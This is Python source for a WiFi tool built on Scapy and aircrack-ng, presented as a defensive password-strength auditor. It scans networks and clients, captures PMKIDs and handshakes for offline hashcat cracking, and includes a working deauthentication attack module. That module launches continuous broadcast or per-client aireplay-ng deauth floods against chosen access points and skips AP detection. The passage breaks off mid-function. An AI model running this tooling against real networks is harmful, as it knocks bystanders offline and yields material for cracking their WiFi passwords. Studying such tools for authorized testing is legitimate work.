"""
PMKID Capture Module
Defensive WiFi security auditing tool - test your own network's password strength.

How PMKID capture works:
1. When a client connects to a WPA2 AP, the AP sends EAPOL Message 1
2. This message contains the PMKID in the RSN (Robust Security Network) Key Data field
3. PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_Client)
4. The PMKID can be used for offline password testing with hashcat (mode 22000)

This tool uses Scapy for cross-platform packet capture and proper frame parsing.
Requires: monitor mode WiFi interface OR a deliberate connection attempt with wrong password.

IMPORTANT: Only use on networks you own or have explicit authorization to test.
"""

import os
import sys
import time
import json
import socket
import struct
import subprocess
import platform
import threading
from datetime import datetime
from typing import Optional, Dict, List, Tuple

try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeResp,
        Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas,
        RadioTap, EAPOL, Raw, conf, sendp, Ether,
        get_if_list, get_if_hwaddr
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class WiFiNetwork:
    """Represents a discovered WiFi network."""

    def __init__(self, ssid: str, bssid: str, channel: int = 0,
                 signal: int = 0, encryption: str = "Unknown"):
        self.ssid = ssid
        self.bssid = bssid
        self.channel = channel
        self.signal = signal
        self.encryption = encryption
        self.first_seen = datetime.now().isoformat()
        self.last_seen = datetime.now().isoformat()
        self.beacon_count = 0
        self.clients: set = set()  # Set of client MAC addresses associated with this AP

    def to_dict(self) -> Dict:
        return {
            "ssid": self.ssid,
            "bssid": self.bssid,
            "channel": self.channel,
            "signal": self.signal,
            "encryption": self.encryption,
            "first_seen": self.first_seen,
            "last_seen": self.last_seen,
            "beacon_count": self.beacon_count,
            "clients": list(self.clients),
        }


class PMKIDCapture:
    """
    PMKID capture and WiFi auditing tool.

    Modes of operation:
    1. Passive scan: Discover nearby WiFi networks (beacons)
    2. PMKID capture: Capture PMKID from EAPOL handshake frames
    3. Handshake capture: Capture full 4-way WPA2 handshake

    The PMKID is found in EAPOL Message 1 from the AP, inside the
    Key Data field as a PMKID KDE (Key Data Encapsulation):
      - Type: 0xdd (vendor specific)
      - Length: 0x14 (20 bytes)
      - OUI: 00:0f:ac (IEEE 802.11)
      - Data Type: 0x04 (PMKID)
      - PMKID: 16 bytes
    """

    def __init__(self, interface: str = None):
        self.interface = interface
        self.running = False
        self.scanning = False
        self.networks: Dict[str, WiFiNetwork] = {}  # bssid -> WiFiNetwork
        self.captured_pmkids: List[Dict] = []
        self.captured_handshakes: List[Dict] = []
        self.eapol_frames: Dict[str, List] = {}  # bssid -> [frame1, frame2, ...]
        self.packet_count = 0
        self.eapol_count = 0
        self.lock = threading.Lock()
        self.log_entries: List[Dict] = []
        self.monitor_mode_active = False
        self.monitor_interface = None  # Actual interface name when in monitor mode (e.g. wlan0mon)
        self.deauth_running = False
        self.deauth_target = ""
        self.deauth_count = 0
        self.deauth_clients: set = set()  # Client MACs discovered during deauth

        # Client scanning
        self.client_scanning = False
        self.client_scan_proc = None  # airodump-ng subprocess
        self.discovered_clients: List[Dict] = []  # [{mac, bssid, ssid, signal, vendor, ...}]

        # Detect available interfaces
        self.available_interfaces = self._detect_wifi_interfaces()

    def _log(self, level: str, message: str):
        """Add a log entry."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "level": level,
            "message": message,
        }
        with self.lock:
            self.log_entries.append(entry)
            if len(self.log_entries) > 500:
                self.log_entries = self.log_entries[-500:]

    def _detect_wifi_interfaces(self) -> List[Dict]:
        """Detect available WiFi interfaces on the system."""
        interfaces = []
        system = platform.system()

        try:
            if system == "Darwin":  # macOS
                # List WiFi interfaces
                result = subprocess.run(
                    ["networksetup", "-listallhardwareports"],
                    capture_output=True, text=True, timeout=5
                )
                lines = result.stdout.split("\n")
                current_name = None
                for line in lines:
                    if line.startswith("Hardware Port:"):
                        current_name = line.split(":", 1)[1].strip()
                    elif line.startswith("Device:") and current_name:
                        device = line.split(":", 1)[1].strip()
                        is_wifi = "wi-fi" in current_name.lower() or "airport" in current_name.lower()
                        interfaces.append({
                            "name": device,
                            "description": current_name,
                            "is_wifi": is_wifi,
                        })
                        current_name = None

                # Also check for monitor mode interfaces
                try:
                    result = subprocess.run(
                        ["ifconfig"], capture_output=True, text=True, timeout=5
                    )
                    for line in result.stdout.split("\n"):
                        if line and not line.startswith("\t") and ":" in line:
                            iface = line.split(":")[0]
                            if iface.startswith("mon") or "monitor" in iface.lower():
                                interfaces.append({
                                    "name": iface,
                                    "description": "Monitor mode interface",
                                    "is_wifi": True,
                                })
                except Exception:
                    pass

            elif system == "Linux":
                # Check /sys/class/net for wireless interfaces
                try:
                    for iface in os.listdir("/sys/class/net"):
                        wireless_path = f"/sys/class/net/{iface}/wireless"
                        phy_path = f"/sys/class/net/{iface}/phy80211"
                        is_wifi = os.path.exists(wireless_path) or os.path.exists(phy_path)

                        interfaces.append({
                            "name": iface,
                            "description": "Wireless" if is_wifi else "Wired",
                            "is_wifi": is_wifi,
                        })
                except Exception:
                    pass

                # Also use iw to find wireless interfaces
                try:
                    result = subprocess.run(
                        ["iw", "dev"], capture_output=True, text=True, timeout=5
                    )
                    current_iface = None
                    for line in result.stdout.split("\n"):
                        line = line.strip()
                        if line.startswith("Interface"):
                            current_iface = line.split()[1]
                        elif "type" in line and current_iface:
                            iface_type = line.split()[-1]
                            # Check if already in list
                            existing = next((i for i in interfaces if i["name"] == current_iface), None)
                            if existing:
                                existing["mode"] = iface_type
                            else:
                                interfaces.append({
                                    "name": current_iface,
                                    "description": f"Wireless ({iface_type})",
                                    "is_wifi": True,
                                    "mode": iface_type,
                                })
                except FileNotFoundError:
                    pass

        except Exception as e:
            self._log("error", f"Error detecting interfaces: {e}")

        return interfaces

    def get_wifi_interfaces(self) -> List[Dict]:
        """Return WiFi-capable interfaces (re-detects each call)."""
        self.available_interfaces = self._detect_wifi_interfaces()
        return [i for i in self.available_interfaces if i.get("is_wifi", False)]

    # ─── Monitor Mode ────────────────────────────────────────────────

    def enable_monitor_mode(self, interface: str) -> Tuple[bool, str]:
        """
        Enable monitor mode on a WiFi interface.
        Returns (success, message_or_monitor_interface_name).
        """
        system = platform.system()

        try:
            if system == "Darwin":
                # macOS: Use airport utility or create monitor interface
                # On macOS, we can use the airport command or tcpdump with monitor flag
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

                if os.path.exists(airport_path):
                    # Disassociate first
                    subprocess.run(
                        [airport_path, "-z"], capture_output=True, timeout=5
                    )
                    self._log("info", f"Disassociated {interface} from current network")

                    # Enable sniffing on a channel
                    # On macOS, sniffing is done via en0 with BPF
                    self.monitor_mode_active = True
                    self.monitor_interface = interface
                    self._log("info", f"Monitor mode enabled on {interface} (macOS passive capture)")
                    return True, interface
                else:
                    # Fallback: use Scapy's native capture (works in managed mode for EAPOL)
                    self._log("warning", "Airport utility not found. Using passive capture mode.")
                    self.monitor_mode_active = True
                    self.monitor_interface = interface
                    return True, interface

            elif system == "Linux":
                # Linux: use airmon-ng or iw
                # Try airmon-ng first
                try:
                    # Kill interfering processes
                    subprocess.run(
                        ["airmon-ng", "check", "kill"],
                        capture_output=True, timeout=10
                    )

                    result = subprocess.run(
                        ["airmon-ng", "start", interface],
                        capture_output=True, text=True, timeout=10
                    )

                    # Find monitor interface name (usually wlan0mon or wlan0)
                    mon_iface = interface + "mon"
                    if mon_iface in result.stdout:
                        self.monitor_mode_active = True
                        self.monitor_interface = mon_iface
                        self._log("info", f"Monitor mode enabled: {mon_iface}")
                        return True, mon_iface

                    # Check if interface itself went to monitor mode
                    self.monitor_mode_active = True
                    self.monitor_interface = interface
                    self._log("info", f"Monitor mode enabled on {interface}")
                    return True, interface

                except FileNotFoundError:
                    # airmon-ng not available, try iw
                    subprocess.run(
                        ["ip", "link", "set", interface, "down"],
                        capture_output=True, timeout=5
                    )
                    subprocess.run(
                        ["iw", "dev", interface, "set", "type", "monitor"],
                        capture_output=True, timeout=5
                    )
                    subprocess.run(
                        ["ip", "link", "set", interface, "up"],
                        capture_output=True, timeout=5
                    )
                    self.monitor_mode_active = True
                    self.monitor_interface = interface
                    self._log("info", f"Monitor mode enabled on {interface} (via iw)")
                    return True, interface

        except Exception as e:
            self._log("error", f"Failed to enable monitor mode: {e}")
            return False, str(e)

        return False, "Unsupported platform for monitor mode"

    def disable_monitor_mode(self, interface: str) -> Tuple[bool, str]:
        """Disable monitor mode and restore managed mode."""
        system = platform.system()

        try:
            if system == "Linux":
                try:
                    subprocess.run(
                        ["airmon-ng", "stop", interface],
                        capture_output=True, timeout=10
                    )
                except FileNotFoundError:
                    subprocess.run(
                        ["ip", "link", "set", interface, "down"],
                        capture_output=True, timeout=5
                    )
                    subprocess.run(
                        ["iw", "dev", interface, "set", "type", "managed"],
                        capture_output=True, timeout=5
                    )
                    subprocess.run(
                        ["ip", "link", "set", interface, "up"],
                        capture_output=True, timeout=5
                    )

                # Restart network manager
                subprocess.run(
                    ["systemctl", "start", "NetworkManager"],
                    capture_output=True, timeout=10
                )

            self.monitor_mode_active = False
            self.monitor_interface = None
            self._log("info", f"Monitor mode disabled on {interface}")
            return True, "Monitor mode disabled"

        except Exception as e:
            self._log("error", f"Error disabling monitor mode: {e}")
            return False, str(e)

    def set_channel(self, interface: str, channel: int) -> bool:
        """Set WiFi channel for monitoring."""
        system = platform.system()
        try:
            if system == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if os.path.exists(airport_path):
                    subprocess.run(
                        [airport_path, f"--channel={channel}"],
                        capture_output=True, timeout=5
                    )
            elif system == "Linux":
                subprocess.run(
                    ["iw", "dev", interface, "set", "channel", str(channel)],
                    capture_output=True, timeout=5
                )
            self._log("info", f"Channel set to {channel} on {interface}")
            return True
        except Exception as e:
            self._log("error", f"Failed to set channel: {e}")
            return False

    # ─── Scanning ────────────────────────────────────────────────────

    def _channel_hopper(self, interface: str):
        """Hop through WiFi channels during scanning."""
        # 2.4GHz channels (most common, scan these more often)
        channels_2g = [1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
        # Common 5GHz channels
        channels_5g = [36, 40, 44, 48, 52, 56, 60, 64,
                       149, 153, 157, 161, 165,
                       100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]

        while self.running:
            # Scan 2.4GHz channels with longer dwell (most APs are here)
            for ch in channels_2g:
                if not self.running:
                    break
                try:
                    result = subprocess.run(
                        ["iw", "dev", interface, "set", "channel", str(ch)],
                        capture_output=True, timeout=2
                    )
                    if result.returncode == 0:
                        time.sleep(0.5)  # 500ms dwell — enough for multiple beacons
                except Exception:
                    pass

            # Then scan 5GHz channels
            for ch in channels_5g:
                if not self.running:
                    break
                try:
                    result = subprocess.run(
                        ["iw", "dev", interface, "set", "channel", str(ch)],
                        capture_output=True, timeout=2
                    )
                    if result.returncode == 0:
                        time.sleep(0.3)  # 300ms dwell for 5GHz
                except Exception:
                    pass

    def scan_networks(self, interface: str, duration: int = 10) -> List[Dict]:
        """
        Scan for nearby WiFi networks by capturing beacon frames.
        Works in both monitor and managed mode (managed mode uses OS scan).
        """
        if not SCAPY_AVAILABLE:
            return self._scan_with_os(interface)

        self._log("info", f"Scanning for WiFi networks on {interface} ({duration}s)...")
        self.scanning = True
        self.running = True
        self.networks.clear()

        # Start channel hopping in background if in monitor mode
        hopper_thread = None
        if self.monitor_mode_active:
            hopper_thread = threading.Thread(
                target=self._channel_hopper, args=(interface,), daemon=True
            )
            hopper_thread.start()
            self._log("info", "Channel hopping started (2.4GHz + 5GHz)")

        try:
            sniff(
                iface=interface,
                prn=self._process_beacon,
                timeout=duration,
                store=False,
                monitor=self.monitor_mode_active,
                stop_filter=lambda pkt: not self.scanning,
            )
        except Exception as e:
            self._log("warning", f"Scapy scan failed ({e}), falling back to OS scan")
            self.scanning = False
            self.running = False
            return self._scan_with_os(interface)

        self.scanning = False
        self.running = False
        if hopper_thread:
            hopper_thread.join(timeout=2)

        result = [n.to_dict() for n in self.networks.values()]
        self._log("info", f"Scan complete: {len(result)} networks found")
        return result

    def stop_scan(self):
        """Stop an active network scan."""
        if self.scanning:
            self.scanning = False
            self._log("info", "Scan stopped by user")

    def _scan_with_os(self, interface: str) -> List[Dict]:
        """Fallback: scan using OS-level WiFi utilities."""
        networks = []
        system = platform.system()

        try:
            if system == "Darwin":
                airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
                if os.path.exists(airport_path):
                    result = subprocess.run(
                        [airport_path, "-s"],
                        capture_output=True, text=True, timeout=15
                    )
                    lines = result.stdout.strip().split("\n")
                    if len(lines) > 1:
                        for line in lines[1:]:
                            parts = line.split()
                            if len(parts) >= 7:
                                # airport -s format: SSID BSSID RSSI CHANNEL HT CC SECURITY
                                ssid = parts[0]
                                bssid = parts[1]
                                try:
                                    rssi = int(parts[2])
                                except ValueError:
                                    rssi = 0
                                try:
                                    channel = int(parts[3].split(",")[0])
                                except (ValueError, IndexError):
                                    channel = 0
                                security = " ".join(parts[6:]) if len(parts) > 6 else "Unknown"

                                networks.append({
                                    "ssid": ssid,
                                    "bssid": bssid,
                                    "channel": channel,
                                    "signal": rssi,
                                    "encryption": security,
                                    "first_seen": datetime.now().isoformat(),
                                    "last_seen": datetime.now().isoformat(),
                                    "beacon_count": 0,
                                })
                else:
                    # Use CoreWLAN via system_profiler
                    result = subprocess.run(
                        ["system_profiler", "SPAirPortDataType"],
                        capture_output=True, text=True, timeout=15
                    )
                    self._log("info", "Used system_profiler for WiFi scan")

            elif system == "Linux":
                result = subprocess.run(
                    ["iwlist", interface, "scan"],
                    capture_output=True, text=True, timeout=30
                )
                import re
                cells = result.stdout.split("Cell ")
                for cell in cells[1:]:
                    ssid_match = re.search(r'ESSID:"(.+?)"', cell)
                    bssid_match = re.search(r'Address: ([\w:]+)', cell)
                    channel_match = re.search(r'Channel:(\d+)', cell)
                    signal_match = re.search(r'Signal level=(-?\d+)', cell)
                    encrypt_match = re.search(r'Encryption key:(on|off)', cell)
                    wpa_match = re.search(r'(WPA2?|WPA3)', cell)

                    if ssid_match and bssid_match:
                        networks.append({
                            "ssid": ssid_match.group(1),
                            "bssid": bssid_match.group(1),
                            "channel": int(channel_match.group(1)) if channel_match else 0,
                            "signal": int(signal_match.group(1)) if signal_match else 0,
                            "encryption": wpa_match.group(1) if wpa_match else (
                                "WEP" if encrypt_match and encrypt_match.group(1) == "on" else "Open"
                            ),
                            "first_seen": datetime.now().isoformat(),
                            "last_seen": datetime.now().isoformat(),
                            "beacon_count": 0,
                        })

        except Exception as e:
            self._log("error", f"OS scan failed: {e}")

        self._log("info", f"OS scan found {len(networks)} networks")
        return networks

    def _process_beacon(self, packet):
        """Process a beacon/probe response frame."""
        if not packet.haslayer(Dot11):
            return

        self.packet_count += 1

        # Check for beacon or probe response
        if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
            try:
                bssid = packet[Dot11].addr2
                if not bssid:
                    return

                # Extract SSID
                ssid = ""
                crypto = set()
                channel = 0

                stats = packet[Dot11Beacon].network_stats() if packet.haslayer(Dot11Beacon) else {}
                ssid = stats.get("ssid", "")
                channel = stats.get("channel", 0)
                crypto = stats.get("crypto", set())

                if bssid not in self.networks:
                    enc_str = "/".join(crypto) if crypto else "Open"
                    self.networks[bssid] = WiFiNetwork(
                        ssid=ssid or "<Hidden>",
                        bssid=bssid,
                        channel=channel,
                        encryption=enc_str,
                    )
                    # Try to get signal strength from RadioTap
                    if packet.haslayer(RadioTap):
                        try:
                            self.networks[bssid].signal = packet[RadioTap].dBm_AntSignal
                        except (AttributeError, TypeError):
                            pass

                self.networks[bssid].last_seen = datetime.now().isoformat()
                self.networks[bssid].beacon_count += 1

            except Exception:
                pass

        # Also check for EAPOL frames
        if packet.haslayer(EAPOL):
            self._process_eapol(packet)

    # ─── Client Scanning ─────────────────────────────────────────────
    #
    # Discover active clients connected to specific APs using airodump-ng.
    # Returns detailed info: MAC, associated AP, signal, vendor name.

    def _resolve_mac_vendor(self, mac: str) -> str:
        """Resolve MAC address to vendor/manufacturer name using Scapy's DB."""
        if not SCAPY_AVAILABLE:
            return ""
        try:
            from scapy.all import conf as scapy_conf
            vendor = scapy_conf.manufdb._resolve_MAC(mac)
            if vendor and vendor != mac:
                return vendor
        except Exception:
            pass
        # Fallback: read nmap MAC prefix DB
        try:
            prefix = mac.upper().replace(":", "")[:6]
            with open("/usr/share/nmap/nmap-mac-prefixes", "r") as f:
                for line in f:
                    if line.startswith(prefix):
                        return line.split(" ", 1)[1].strip()
        except Exception:
            pass
        return ""

    def start_client_scan(self, interface: str, targets: List[Dict],
                          duration: int = 30) -> bool:
        """
        Start scanning for clients connected to selected APs.

        Uses airodump-ng to capture probe/data frames and identify
        which client MACs are associated with which APs.

        Args:
            interface: Monitor mode interface
            targets: List of {"bssid": "...", "channel": N, "ssid": "..."} dicts
            duration: Scan duration in seconds (0 = until stopped)
        """
        if not self.monitor_mode_active:
            self._log("error", "Monitor mode required for client scan")
            return False

        if self.client_scanning:
            self._log("warning", "Client scan already running")
            return False

        mon_iface = self.monitor_interface or interface
        self.client_scanning = True
        self.discovered_clients = []

        self._log("info", f"Starting client scan on {len(targets)} AP(s)...")

        thread = threading.Thread(
            target=self._client_scan_loop,
            args=(mon_iface, targets, duration),
            daemon=True,
        )
        thread.start()
        return True

    def stop_client_scan(self):
        """Stop an active client scan."""
        if self.client_scanning:
            self.client_scanning = False
            if self.client_scan_proc:
                try:
                    self.client_scan_proc.terminate()
                    self.client_scan_proc.wait(timeout=3)
                except Exception:
                    try:
                        self.client_scan_proc.kill()
                    except Exception:
                        pass
                self.client_scan_proc = None
            self._log("info", f"Client scan stopped. {len(self.discovered_clients)} client(s) found.")

    def get_client_scan_status(self) -> Dict:
        """Get client scan status and results."""
        return {
            "scanning": self.client_scanning,
            "clients": self.discovered_clients,
            "count": len(self.discovered_clients),
        }

    def _parse_airodump_clients(self, csv_file: str,
                                target_lookup: Dict[str, Dict]) -> List[Dict]:
        """
        Parse airodump-ng CSV output for client stations.

        Returns list of client dicts with AP association and vendor info.
        """
        clients = []
        seen_macs = set()

        if not os.path.exists(csv_file):
            return clients

        try:
            with open(csv_file, "r", errors="ignore") as f:
                content = f.read()
        except Exception:
            return clients

        # airodump CSV format:
        # Section 1: APs (BSSID, First time seen, Last time seen, channel, Speed,
        #                  Privacy, Cipher, Authentication, Power, # beacons,
        #                  # IV, LAN IP, ID-length, ESSID, Key)
        # Section 2: Clients (Station MAC, First time seen, Last time seen,
        #                      Power, # packets, BSSID, Probed ESSIDs)
        in_client_section = False
        for line in content.splitlines():
            line = line.strip()
            if line.startswith("Station MAC"):
                in_client_section = True
                continue
            if not in_client_section or not line:
                continue

            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 7:
                continue

            station_mac = parts[0].strip()
            if len(station_mac) != 17 or ":" not in station_mac:
                continue

            # Skip already seen (dedup across multiple CSV reads)
            mac_upper = station_mac.upper()
            if mac_upper in seen_macs:
                continue
            seen_macs.add(mac_upper)

            # Parse fields
            try:
                power = int(parts[3].strip()) if parts[3].strip().lstrip('-').isdigit() else 0
            except (ValueError, IndexError):
                power = 0

            try:
                packets = int(parts[4].strip()) if parts[4].strip().isdigit() else 0
            except (ValueError, IndexError):
                packets = 0

            assoc_bssid = parts[5].strip() if len(parts) > 5 else ""
            probed = parts[6].strip() if len(parts) > 6 else ""

            # Check if this client is associated with one of our target APs
            assoc_bssid_upper = assoc_bssid.upper()
            target_info = target_lookup.get(assoc_bssid_upper)

            # Skip clients not associated with our targets
            # "(not associated)" means the client is probing but not connected
            if not target_info and assoc_bssid != "(not associated)":
                continue

            # Resolve vendor from MAC
            vendor = self._resolve_mac_vendor(station_mac)

            client = {
                "mac": mac_upper,
                "bssid": assoc_bssid_upper if target_info else "",
                "ssid": target_info["ssid"] if target_info else "",
                "channel": target_info["channel"] if target_info else 0,
                "signal": power,
                "packets": packets,
                "vendor": vendor,
                "probed": probed,
                "associated": bool(target_info),
            }
            clients.append(client)

        return clients

    def _client_scan_loop(self, interface: str, targets: List[Dict],
                          duration: int):
        """
        Run airodump-ng to discover clients on target APs.

        Runs continuously (updating results every few seconds) until
        stopped or duration expires.
        """
        import tempfile
        import glob as globmod

        # Build lookup: BSSID -> {ssid, channel}
        target_lookup = {}
        bssid_filter = []
        channels = set()
        for t in targets:
            bssid = t.get("bssid", "").strip().upper()
            if bssid:
                target_lookup[bssid] = {
                    "ssid": t.get("ssid", ""),
                    "channel": t.get("channel", 0),
                }
                bssid_filter.append(bssid)
                ch = t.get("channel", 0)
                if ch > 0:
                    channels.add(str(ch))

        prefix = tempfile.mktemp(prefix="clientscan_")

        try:
            # Build airodump-ng command
            cmd = [
                "airodump-ng",
                "--write", prefix,
                "--output-format", "csv",
                "--write-interval", "3",
            ]
            # Filter by BSSID if single target, otherwise scan all and filter later
            if len(bssid_filter) == 1:
                cmd.extend(["--bssid", bssid_filter[0]])
            # Filter by channels
            if channels:
                cmd.extend(["-c", ",".join(sorted(channels))])
            cmd.append(interface)

            self._log("info", f"airodump-ng scanning {len(targets)} AP(s) "
                      f"on channel(s) {','.join(sorted(channels)) or 'all'}...")
            self.client_scan_proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )

            start_time = time.time()
            while self.client_scanning:
                # Check if duration expired
                if duration > 0 and (time.time() - start_time) >= duration:
                    break

                time.sleep(3)

                # Parse current results
                csv_file = prefix + "-01.csv"
                clients = self._parse_airodump_clients(csv_file, target_lookup)
                if clients:
                    self.discovered_clients = clients

        except Exception as e:
            self._log("error", f"Client scan error: {e}")
        finally:
            # Stop airodump-ng
            if self.client_scan_proc:
                try:
                    self.client_scan_proc.terminate()
                    self.client_scan_proc.wait(timeout=3)
                except Exception:
                    try:
                        self.client_scan_proc.kill()
                    except Exception:
                        pass
                self.client_scan_proc = None

            # Final parse
            csv_file = prefix + "-01.csv"
            clients = self._parse_airodump_clients(csv_file, target_lookup)
            if clients:
                self.discovered_clients = clients

            # Update network objects with discovered clients
            for client in self.discovered_clients:
                bssid = client.get("bssid", "")
                if bssid and bssid in self.networks:
                    self.networks[bssid].clients.add(client["mac"])

            # Clean up temp files
            for f in globmod.glob(prefix + "*"):
                try:
                    os.remove(f)
                except OSError:
                    pass

            self.client_scanning = False
            self._log("info", f"Client scan complete. {len(self.discovered_clients)} client(s) found.")

    # ─── Deauthentication Attack ────────────────────────────────────
    #
    # Delegates to aireplay-ng for reliable 802.11 frame injection,
    # the same way the Flipper Zero deauther.c delegates to ESP32
    # Marauder via UART commands like "attack -t deauth".
    #
    # aireplay-ng handles driver quirks, proper RadioTap headers,
    # injection rate control, and client targeting — all the things
    # that make Scapy's sendp() unreliable across different chipsets.
    #
    # Flow (mirrors deauther.c do_attack):
    #   1. Set channel (like Marauder's "channel N")
    #   2. Discover clients via airodump-ng (like Marauder's "scanap")
    #   3. Launch aireplay-ng per client + broadcast (like "attack -t deauth")
    #   4. Periodically re-scan for new clients that reconnect

    def _find_deauth_tool(self) -> Optional[str]:
        """Check which deauth injection tool is available."""
        for tool in ["aireplay-ng"]:
            try:
                subprocess.run([tool, "--help"], capture_output=True, timeout=5)
                return tool
            except FileNotFoundError:
                continue
        return None

    def _discover_clients_airodump(self, interface: str, target_bssid: str,
                                   channel: int, duration: int = 10) -> set:
        """
        Discover clients connected to target AP using airodump-ng.

        Runs airodump-ng for a few seconds targeting the specific BSSID/channel,
        then parses the CSV output for associated station MACs.
        This is how Marauder discovers targets before running "attack -t deauth".
        """
        import tempfile
        found_clients = set()
        prefix = tempfile.mktemp(prefix="deauth_scan_")

        try:
            cmd = [
                "airodump-ng",
                "--bssid", target_bssid,
                "-c", str(channel) if channel > 0 else "1",
                "--write", prefix,
                "--output-format", "csv",
                "--write-interval", "1",
                interface,
            ]
            self._log("info", f"Scanning clients with airodump-ng ({duration}s)...")
            proc = subprocess.Popen(
                cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            time.sleep(duration)
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            # Parse the CSV for client stations
            csv_file = prefix + "-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, "r", errors="ignore") as f:
                    content = f.read()

                # airodump CSV has two sections separated by blank line:
                # Section 1: APs   (header: BSSID, First time seen, ...)
                # Section 2: Clients (header: Station MAC, First time seen, ... , BSSID)
                in_client_section = False
                for line in content.splitlines():
                    line = line.strip()
                    if line.startswith("Station MAC"):
                        in_client_section = True
                        continue
                    if not in_client_section or not line:
                        continue

                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) >= 7:
                        station_mac = parts[0].strip()
                        assoc_bssid = parts[5].strip()
                        # Client associated with our target AP
                        if (assoc_bssid.lower() == target_bssid.lower() and
                                len(station_mac) == 17 and ":" in station_mac):
                            found_clients.add(station_mac)

        except Exception as e:
            self._log("warning", f"Client discovery error: {e}")
        finally:
            # Clean up temp files
            import glob as globmod
            for f in globmod.glob(prefix + "*"):
                try:
                    os.remove(f)
                except OSError:
                    pass

        return found_clients

    def start_deauth(self, interface: str, target_bssid=None,
                     channel: int = 0, count: int = 0,
                     targets: List[Dict] = None,
                     clients: List[Dict] = None) -> bool:
        """
        Start deauthentication attack on APs and/or specific clients.

        Three modes:
          1. AP-only: targets=[{bssid, channel}] — broadcast deauth all clients
          2. Client-only: clients=[{mac, bssid, channel}] — deauth specific clients
          3. Both: targets + clients — broadcast on APs + targeted on clients

        Args:
            interface: WiFi interface (must be in monitor mode)
            target_bssid: Single BSSID string (backward compat)
            channel: Channel override for single target (0 = auto)
            count: Number of deauth packets per round (0 = continuous)
            targets: List of {"bssid": "...", "channel": N} dicts for AP targets.
            clients: List of {"mac": "...", "bssid": "...", "channel": N} dicts
                     for targeted client deauth.
        """
        if not self.monitor_mode_active:
            self._log("error", "Monitor mode required for deauthentication")
            return False

        if self.deauth_running:
            self._log("warning", "Deauth already running")
            return False

        tool = self._find_deauth_tool()
        if not tool:
            self._log("error", "aireplay-ng not found. Install aircrack-ng.")
            return False

        # Use the actual monitor interface (e.g. wlan0mon)
        mon_iface = self.monitor_interface or interface
        if mon_iface != interface:
            self._log("info", f"Using monitor interface {mon_iface} (requested: {interface})")

        # Build target list — supports both single and multi-target
        # Like deauther.c: select -a 0,3,5 picks multiple APs
        target_list = []
        if targets:
            for t in targets:
                bssid = t.get("bssid", "").strip()
                ch = t.get("channel", 0)
                if not bssid:
                    continue
                # Auto-detect channel from scanned networks
                if ch == 0 and bssid in self.networks:
                    ch = self.networks[bssid].channel
                ssid = self.networks[bssid].ssid if bssid in self.networks else ""
                target_list.append({"bssid": bssid, "channel": ch, "ssid": ssid})
        elif target_bssid:
            # Single target (backward compat)
            if channel == 0 and target_bssid in self.networks:
                channel = self.networks[target_bssid].channel
            ssid = self.networks[target_bssid].ssid if target_bssid in self.networks else ""
            target_list.append({"bssid": target_bssid, "channel": channel, "ssid": ssid})

        # Build client target list
        client_list = []
        if clients:
            for c in clients:
                mac = c.get("mac", "").strip()
                bssid = c.get("bssid", "").strip()
                ch = c.get("channel", 0)
                if not mac or not bssid:
                    continue
                if ch == 0 and bssid in self.networks:
                    ch = self.networks[bssid].channel
                client_list.append({"mac": mac, "bssid": bssid, "channel": ch})

        if not target_list and not client_list:
            self._log("error", "No valid targets specified")
            return False

        self.deauth_running = True
        self.deauth_targets = target_list
        self.deauth_target = ", ".join(t["bssid"] for t in target_list) if target_list else ""
        self.deauth_count = 0
        self.deauth_clients = set(c["mac"] for c in client_list)
        self._deauth_processes = []

        desc_parts = []
        if target_list:
            desc_parts.append(f"{len(target_list)} AP(s)")
        if client_list:
            desc_parts.append(f"{len(client_list)} client(s)")
        self._log("warning", f"Starting deauth on {' + '.join(desc_parts)} via {mon_iface}")

        thread = threading.Thread(
            target=self._deauth_loop_multi,
            args=(mon_iface, target_list, count, client_list),
            daemon=True,
        )
        thread.start()
        return True

    def stop_deauth(self):
        """Stop deauthentication attack — kill all aireplay-ng processes."""
        if self.deauth_running:
            self.deauth_running = False
            # Kill all spawned aireplay-ng processes
            for proc in getattr(self, "_deauth_processes", []):
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
            self._deauth_processes = []
            self._log("info", f"Deauth stopped. {self.deauth_count} frames sent to "
                      f"{len(self.deauth_clients)} client(s).")

    def get_deauth_status(self) -> Dict:
        """Get current deauth attack status."""
        return {
            "running": self.deauth_running,
            "target": self.deauth_target,
            "targets": getattr(self, "deauth_targets", []),
            "frames_sent": self.deauth_count,
            "interface": self.monitor_interface,
            "clients": list(self.deauth_clients),
        }

    def _spawn_aireplay(self, interface: str, target_bssid: str,
                        client_mac: Optional[str] = None,
                        count: int = 0) -> Optional[subprocess.Popen]:
        """
        Spawn a single aireplay-ng --deauth process.

        Like deauther.c's uart_tx(app, "attack -t deauth") which tells
        Marauder to start deauthing — we tell aireplay-ng the same way.

        Args:
            interface: Monitor mode interface
            target_bssid: AP BSSID (-a)
            client_mac: Specific client (-c), None for broadcast
            count: 0 = continuous, N = send N deauths then stop
        """
        cmd = [
            "aireplay-ng",
            "--deauth", str(count) if count > 0 else "0",
            "-a", target_bssid,
            "--ignore-negative-one",  # Skip channel mismatch checks — faster
            "-D",                     # Disable AP detection — skip wait, attack immediately
        ]
        if client_mac:
            cmd.extend(["-c", client_mac])
        cmd.append(interface)

        target_desc = client_mac if client_mac else "broadcast"
        try:
            proc = subprocess.Popen(
